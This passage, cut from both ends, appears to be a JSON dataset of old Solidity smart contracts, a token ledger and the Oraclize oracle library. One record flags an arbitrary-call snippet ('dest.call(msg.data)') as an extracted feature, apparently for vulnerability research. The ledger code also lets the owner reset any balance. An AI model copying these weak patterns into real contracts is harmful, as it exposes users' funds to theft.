ledger.balanceOf(_addr);\n }\n}\ncontract Ledger is Owned {\n mapping (address => uint) balances;\n mapping (address => uint) usedToday;\n mapping (address => bool) seenHere;\n address[] public seenHereA;\n mapping (address => mapping (address => uint256)) allowed;\n address token;\n uint public totalSupply = 0;\n function Ledger(address _owner, uint _preMined, uint ONE) {\n if (_owner == 0x0) throw;\n owner = _owner;\n seenHere[_owner] = true;\n seenHereA.push(_owner);\n totalSupply = _preMined *ONE;\n balances[_owner] = totalSupply;\n }\n modifier onlyToken {\n if (msg.sender != token) throw;\n _;\n }\n modifier onlyTokenOrOwner {\n if (msg.sender != token && msg.sender != owner) throw;\n _;\n }\n function tokenTransfer(address _from, address _to, uint amount) onlyToken returns(bool) {\n if (amount > balances[_from]) return false;\n if ((balances[_to] + amount) < balances[_to]) return false;\n if (amount == 0) { return false; }\n balances[_from] -= amount;\n balances[_to] += amount;\n if (seenHere[_to] == false) {\n seenHereA.push(_to);\n seenHere[_to] = true;\n }\n return true;\n }\n function tokenTransferFrom(address _sender, address _from, address _to, uint amount) onlyToken returns(bool) {\n if (allowed[_from][_sender] <= amount) return false;\n if (amount > balanceOf(_from)) return false;\n if (amount == 0) return false;\n if ((balances[_to] + amount) < amount) return false;\n balances[_from] -= amount;\n balances[_to] += amount;\n allowed[_from][_sender] -= amount;\n if (seenHere[_to] == false) {\n seenHereA.push(_to);\n seenHere[_to] = true;\n }\n return true;\n }\n function changeUsed(address _addr, int amount) onlyToken {\n int myToday = int(usedToday[_addr]) + amount;\n usedToday[_addr] = uint(myToday);\n }\n function resetUsedToday(uint8 startI, uint8 numTimes) onlyTokenOrOwner returns(uint8) {\n uint8 numDeleted;\n for (uint i = 0; i < numTimes && i + startI < seenHereA.length; i++) {\n if (usedToday[seenHereA[i+startI]] != 0) {\n delete usedToday[seenHereA[i+startI]];\n numDeleted++;\n }\n }\n return numDeleted;\n }\n function balanceOf(address _addr) constant returns (uint) {\n if (usedToday[_addr] >= balances[_addr]) { return 0;}\n return balances[_addr] - usedToday[_addr];\n }\n event Approval(address, address, uint);\n function tokenApprove(address _from, address _spender, uint256 _value) onlyToken returns (bool) {\n allowed[_from][_spender] = _value;\n Approval(_from, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function changeToken(address _token) onlyOwner {\n token = Token(_token);\n }\n function reduceTotalSupply(uint amount) onlyToken {\n if (amount > totalSupply) throw;\n totalSupply -= amount;\n }\n function setBalance(address _addr, uint amount) onlyTokenOrOwner {\n if (balances[_addr] == amount) { return; }\n if (balances[_addr] < amount) {\n uint increase = amount - balances[_addr];\n totalSupply += increase;\n } else {\n uint decrease = balances[_addr] - amount;\n totalSupply -= decrease;\n }\n balances[_addr] = amount;\n }\n}",
  "extract_feature": [
    "function exec(address dest) onlyOwner {\nif (!dest.call(msg.data)) throw;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1624"
  },
  "filename": "38810.sol",
  "content": "pragma solidity ^0.4.11;\npragma solidity ^0.4.0;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n function setConfig(bytes32 _config);\n function setCustomGasPrice(uint _gasPrice);\n function randomDS_getSessionPubKeyHash() returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0)) oraclize_setNetwork(networkID_auto);\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n }\n function oraclize_useCoupon(string code) oraclizeAPI internal {\n oraclize.useCoupon(code);\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_setConfig(bytes32 config) oraclizeAPI internal {\n return oraclize.setConfig(config);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint 